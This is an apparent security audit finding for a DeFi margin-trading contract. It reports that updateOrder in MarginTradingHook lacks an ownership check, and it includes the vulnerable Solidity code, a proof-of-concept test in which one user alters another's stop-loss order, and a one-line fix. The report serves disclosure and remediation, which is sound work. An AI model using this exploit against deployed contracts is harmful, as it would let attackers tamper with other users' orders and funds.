[H-01]  MarginTradingHook#updateOrder lacks access control
Submitted bysashik_eth, also found byrvierdiievandsaid
TheMarginTradingHook#updateOrderfunction allows users to update their orders, it checks that the requested order is active order (L513) and that the function caller has opened position (L515). However, this function fails to check that userinitPosIdis equal to theinitPosIdsaved in the order struct, meaning that the caller is an order creator:
File:MarginTradingHook.sol503:functionupdateOrder(504:uint_posId,505:uint_orderId,506:uint_triggerPrice_e36,507:address_tokenOut,508:uint_limitPrice_e36,509:uint_collAmt510:     )external{511:_require(_collAmt!=0,Errors.ZERO_VALUE);512:Orderstorageorder=__orders[_orderId];513:_require(order.status==OrderStatus.Active,Errors.INVALID_INPUT);514:uintinitPosId=initPosIds[msg.sender][_posId];515:_require(initPosId!=0,Errors.POSITION_NOT_FOUND);516:MarginPosmemorymarginPos=__marginPositions[initPosId];517:uintcollAmt=IPosManager(POS_MANAGER).getCollAmt(initPosId,marginPos.collPool);518:_require(_collAmt<=collAmt,Errors.INPUT_TOO_HIGH);519:520:order.triggerPrice_e36=_triggerPrice_e36;521:order.limitPrice_e36=_limitPrice_e36;522:order.collAmt=_collAmt;523:order.tokenOut=_tokenOut;524:emitUpdateOrder(initPosId,_orderId,_tokenOut,_triggerPrice_e36,_limitPrice_e36,_collAmt);525:     }
Impact
Any order in theMarginTradingHookcontract could be updated by other users.
Proof of Concept
The next test added to theTestMarginTradingHelperfile could show a scenario when the user can update some other active orders:
functiontestUpdateNotOwnerOrder()public{_setUpDexLiquidity(QUOTE_TOKEN,BASE_TOKEN);addresstokenIn=USDT;addresscollToken=WETH;addressborrToken=USDT;{(uintposIdAlice,uintinitPosIdAlice) =_openPos(tokenIn,collToken,borrToken,ALICE,10_000,10_000);(uintposIdBob, ) =_openPos(tokenIn,collToken,borrToken,BOB,10_000,10_000);uintmarkPrice_e36=lens.getMarkPrice_e36(collToken,borrToken);uinttriggerPrice_e36=markPrice_e36*9/10;// 90% from mark priceuintlimitPrice_e36=markPrice_e36*89/100;// 89% from mark priceaddresstokenOut=WETH;MarginPosmemorymarginPos=hook.getMarginPos(initPosIdAlice);uintorderIdAlice=_addStopLossOrder(ALICE,posIdAlice,triggerPrice_e36,tokenOut,limitPrice_e36,positionManager.getCollAmt(initPosIdAlice,marginPos.collPool));vm.startPrank(BOB,BOB);hook.updateOrder(posIdBob,orderIdAlice,triggerPrice_e36-1,tokenOut,limitPrice_e36,1000);vm.stopPrank();Ordermemoryorder=hook.getOrder(orderIdAlice);require(order.triggerPrice_e36==triggerPrice_e36-1,'order not updated');}}
Recommended Mitigation Steps
Consider adding a check that prevents the possibility of updating arbitrary orders, similar to thecancelOrderfunction:
_require(order.initPosId==initPosId,Errors.INVALID_INPUT);
fez-init (INIT) confirmed